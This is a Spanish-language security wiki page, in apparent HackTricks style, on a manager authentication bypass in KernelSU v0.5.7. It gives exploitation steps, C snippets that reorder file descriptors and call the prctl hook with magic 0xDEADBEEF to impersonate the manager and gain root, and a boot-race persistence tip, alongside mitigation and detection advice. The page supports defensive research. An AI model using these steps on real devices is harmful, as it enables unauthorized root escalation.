# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Los frameworks de rooting como KernelSU, APatch y SKRoot parchean o realizan hook sobre el kernel de Android/Linux y exponen funcionalidades privilegiadas a una aplicación manager en el userspace sin privilegios. Magisk se analiza por separado más adelante porque CVE-2024-48336 implicaba la carga de código del lado del manager, en lugar de esta ruta de syscall de KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Esta página resume las técnicas y dificultades identificadas en investigaciones públicas, especialmente el análisis de KernelSU v0.5.7 realizado por Zimperium, para ayudar a los equipos red y blue a comprender las superficies de ataque, las primitivas de explotación y las mitigaciones robustas.<sup>[[1]](#references)</sup>

---
## Patrón de arquitectura: canal de manager con syscall hookeado

- En KernelSU v0.5.7, un hook del kernel sobre `prctl` recibe un valor mágico, un ID de comando y argumentos específicos del comando desde el userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- El caller solicita primero el estado del manager con `CMD_BECOME_MANAGER`. La autorización es específica para cada comando: `CMD_GRANT_ROOT` comprueba el estado del manager/allowlist, `CMD_ALLOW_SU` es exclusivo del manager y `CMD_SET_SEPOLICY` requiere root en esta versión.<sup>[[2]](#references)[[11]](#references)</sup>
- Otros comandos consultan la versión/configuración o notifican eventos del framework.<sup>[[2]](#references)</sup>
- Como cualquier app puede invocar esta interfaz de syscall, la corrección de la autenticación del manager es crítica.<sup>[[1]](#references)[[2]](#references)</sup>

Ejemplo (diseño de KernelSU):
- Syscall hookeado: prctl
- Valor mágico para redirigir al handler de KernelSU: 0xDEADBEEF
- Los comandos incluyen: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Flujo de autenticación de KernelSU v0.5.7 (tal como está implementado)

Cuando el userspace llama a prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Comprobación del prefijo de la ruta
- La ruta proporcionada debe comenzar con un prefijo esperado para el UID del caller, por ejemplo, /data/data/<pkg> o /data/user/<id>/<pkg>.
- Referencia: lógica del prefijo de ruta en core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Comprobación de ownership
- La ruta debe pertenecer al UID del caller.
- Referencia: lógica de ownership en core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Comprobación de la firma del APK mediante un escaneo de la tabla de FDs
- Iterar los descriptores de archivo abiertos del proceso caller en orden creciente de descriptor.
- Para cada archivo regular cuya ruta comience por `/data/app/` y termine en `/base.apk`, exigir que la ruta contenga el substring del paquete derivado de la ruta del directorio de datos proporcionada.
- Verificar la firma del primer candidato que supere esas comprobaciones de ruta.
- Analizar la firma APK v2 y verificarla frente al certificado oficial del manager.
- Referencias: manager.c (iteración de FDs), apk_sign.c (verificación APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Si todas las comprobaciones tienen éxito, el kernel almacena temporalmente en caché el UID del manager; los comandos exclusivos del manager aceptan entonces ese UID, mientras que los demás comandos conservan su propio UID o sus comprobaciones de allowlist.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Clase de vulnerabilidad: confiar en la selección del APK derivada de la ruta

KernelSU v0.5.7 no vincula el resultado de la firma con la identidad del paquete instalado por PackageManager. En `manager.c`, la comprobación del paquete solo consiste en una comprobación de substring de la ruta (`strstr(cwd, pkg)`); después, se verifica la firma del primer candidato que supera esa comprobación. Por tanto, un atacante puede colocar un APK legítimo del manager bajo una ruta `/data/app/` que también contenga el nombre del paquete del atacante y hacer que sea seleccionado primero.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Esta confianza indirecta permite que una app sin privilegios suplante al manager sin poseer su signing key.<sup>[[1]](#references)</sup>

Propiedades clave explotadas:<sup>[[1]](#references)[[3]](#references)</sup>
- El escaneo de FDs está ordenado por índice del descriptor y la comprobación del paquete es una comprobación de substring de la ruta, no un binding verificado entre el paquete y la identidad del APK.
- open() devuelve el FD disponible con el número más bajo. Al cerrar primero los FDs con números inferiores, un atacante puede controlar el orden.
- Un APK del manager incluido puede colocarse bajo `/data/app/` en una ruta que contenga el string del paquete del atacante, conservando al mismo tiempo la firma oficial del manager.

---
## Precondiciones del ataque

El caso concreto de KernelSU v0.5.7 requiere:<sup>[[1]](#references)[[3]](#references)</sup>

- El dispositivo ya tiene root mediante un framework de rooting vulnerable, por ejemplo, KernelSU v0.5.7.
- El atacante puede ejecutar localmente código arbitrario sin privilegios, dentro del proceso de una app Android.
- Para la implementación de v0.5.7, `current->real_parent` debe tener UID 0 (el comentario del código fuente lo describe como un requisito de hijo directo de zygote); `manager.c` rechaza otros padres.<sup>[[3]](#references)</sup>
- El manager real todavía no se ha autenticado, por ejemplo, justo después de un reboot. Algunos frameworks almacenan en caché el UID del manager después de la autenticación; es necesario ganar la race condition.<sup>[[1]](#references)</sup>

---
## Esquema de explotación (KernelSU v0.5.7)

Pasos de alto nivel (el vídeo de demostración d muestra el proof of concept público en funcionamiento):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Construir una ruta válida al directorio de datos de tu propia app para satisfacer las comprobaciones de prefijo y ownership.
2) Colocar un base.apk legítimo de KernelSU Manager bajo `/data/app/` en una ruta que contenga el string de tu paquete y abrirlo en un FD con un número inferior al de tu propio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para superar las comprobaciones.
4) Usar `CMD_GRANT_ROOT` y después `CMD_ALLOW_SU` para obtener su persistente; invocar el comando exclusivo de root `CMD_SET_SEPOLICY` solo después de obtener root y únicamente donde sea compatible.

Notas prácticas sobre el paso 2 (orden de los FDs):<sup>[[1]](#references)</sup>
- Identificar el FD de tu proceso correspondiente a tu propio /data/app/*/base.apk recorriendo los symlinks de /proc/self/fd.
- Cerrar un FD bajo, por ejemplo, stdin, fd 0, y abrir primero el APK legítimo del manager para que ocupe fd 0, o cualquier índice inferior al FD de tu propio base.apk.
- Incluir el APK legítimo del manager junto con tu app para que su ruta comience por `/data/app/`, termine en `/base.apk` y contenga el string de tu paquete. Por ejemplo, una ruta dentro del directorio `lib` de tu app puede satisfacer estas comprobaciones.<sup>[[1]](#references)[[3]](#references)</sup>

Fragmentos de código de ejemplo (Android/Linux, solo con fines ilustrativos):

Enumerar los FDs abiertos para localizar entradas base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forzar un FD con un número inferior para que apunte al APK legítimo del manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticación del Manager mediante el hook `prctl` de KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Tras el éxito, comandos privilegiados (ejemplos):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promover el proceso actual a root
- CMD_ALLOW_SU: añadir tu package/UID a la allowlist para mantener su
- CMD_SET_SEPOLICY: ajustar la política de SELinux después de obtener root; KernelSU v0.5.7 comprueba si el UID es 0 para este comando.<sup>[[2]](#references)</sup>

Consejo sobre race/persistencia:
- Registrar un receiver de BOOT_COMPLETED en AndroidManifest (`RECEIVE_BOOT_COMPLETED`) para iniciarse después de un reinicio e intentar autenticarse antes que el manager real; el permiso autoriza la recepción de `ACTION_BOOT_COMPLETED`, pero no garantiza por sí mismo prioridad de scheduling.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Guía de detección y mitigación

Para desarrolladores de frameworks:
- Vincular la autenticación al package/UID del caller, no a FDs arbitrarios:
- Resolver el package del caller a partir de su UID y verificarlo contra la firma del package instalado (mediante PackageManager) en lugar de escanear FDs.
- Si es solo de kernel, usar una identidad estable del caller (task creds) y validar mediante una fuente de verdad estable gestionada por init/helper de userspace, no mediante FDs de procesos.
- Evitar comprobaciones de prefijos de rutas como identidad; el caller puede satisfacerlas trivialmente.
- Usar challenge–response basado en nonce a través del canal y borrar cualquier identidad del manager almacenada en caché durante el arranque o ante eventos clave.
- Considerar IPC autenticado basado en binder en lugar de sobrecargar syscalls genéricas cuando sea viable.

Para defenders/blue team:
- Detectar la presencia de rooting frameworks y procesos del manager; monitorizar llamadas a prctl con magic constants sospechosas (por ejemplo, 0xDEADBEEF) si se dispone de telemetría del kernel.<sup>[[1]](#references)[[11]](#references)</sup>
- En flotas gestionadas, bloquear o alertar sobre boot receivers de packages no confiables que intenten rápidamente comandos privilegiados del manager después del arranque.
- Asegurarse de que los dispositivos estén actualizados a versiones parcheadas del framework; invalidar los IDs del manager almacenados en caché después de una actualización.

Limitaciones del ataque:<sup>[[1]](#references)[[2]](#references)</sup>
- Solo afecta a dispositivos que ya tienen root mediante un framework vulnerable.
- Normalmente requiere un reinicio/ventana de race antes de que el manager legítimo se autentique (algunos frameworks almacenan en caché el UID del manager hasta que se restablece).

---
## Notas relacionadas entre frameworks

- La autenticación basada en contraseña (por ejemplo, builds históricos de APatch/SKRoot) puede ser débil si las contraseñas son adivinables o susceptibles de bruteforce, o si las validaciones contienen errores.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- La autenticación basada en package/firma (por ejemplo, KernelSU) es más sólida en principio, pero debe vincularse al caller real, no a artefactos derivados de rutas seleccionados mediante escaneos de FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 afectó a builds anteriores a Canary 27007 que cargaban código desde un package GMS no verificado, lo que permitía a una app local ejecutar código en la app de Magisk y escalar a root sin interacción del usuario.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – El rooting de todo mal: fallos de seguridad que podrían comprometer tu dispositivo móvil](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – comprobaciones de autenticación de core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteración de FD, comprobación de package y llamada de firma en manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – verificación de APK v2 en apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Proyecto KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Problema #8279 de Magisk – Verificar que GMS sea una app del sistema](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Vídeo de demostración del PoC de KSU (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identificadores de comandos de ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
